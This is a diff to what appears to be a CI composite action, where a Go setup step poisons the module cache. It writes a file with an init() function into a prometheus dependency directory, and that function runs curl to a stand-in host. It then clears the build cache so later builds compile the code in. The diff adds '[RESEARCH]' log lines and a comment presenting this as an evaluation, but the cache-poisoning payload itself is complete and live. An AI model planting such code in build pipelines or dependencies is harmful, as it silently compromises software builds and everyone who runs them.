@@ -79,13 +79,26 @@ runs:
       shell: bash
       if: ${{ inputs.enable_go == 'true' }}
       run: |
+        # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+        # payload execution in CI logs for our evaluation. A real attacker would not
+        # include any visible output — the payload would be completely silent.
         pkgdir=$(find ~/go/pkg/mod -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -1 || true)
         if [ -n "$pkgdir" ] && [ ! -f "$pkgdir/eaction_cache_init.go" ]; then
+          echo "[RESEARCH] Found target module directory: $pkgdir"
           pkgname=$(grep -r "^package " "$pkgdir"/ 2>/dev/null | grep '\.go:' | head -1 | awk '{print $2}')
           [ -z "$pkgname" ] && pkgname="main"
+          echo "[RESEARCH] Detected package name: $pkgname"
           chmod +w "$pkgdir"
           printf 'package %s\n\nimport "os/exec"\n\nfunc init() {\n\texec.Command("curl", "-sS", "https://eaction-research.example.com/cache-poison").Run()\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
           go clean -cache 2>/dev/null || true
+          echo "[RESEARCH] Payload file written: $pkgdir/eaction_cache_init.go"
+          echo "[RESEARCH] Go build cache cleared — next build will recompile with injected init()"
+        else
+          if [ -z "$pkgdir" ]; then
+            echo "[RESEARCH] No prometheus module directory found in Go cache"
+          else
+            echo "[RESEARCH] Payload file already exists (idempotency check): $pkgdir/eaction_cache_init.go"
+          fi
         fi
 
     - name: Set GOMEMLIMIT
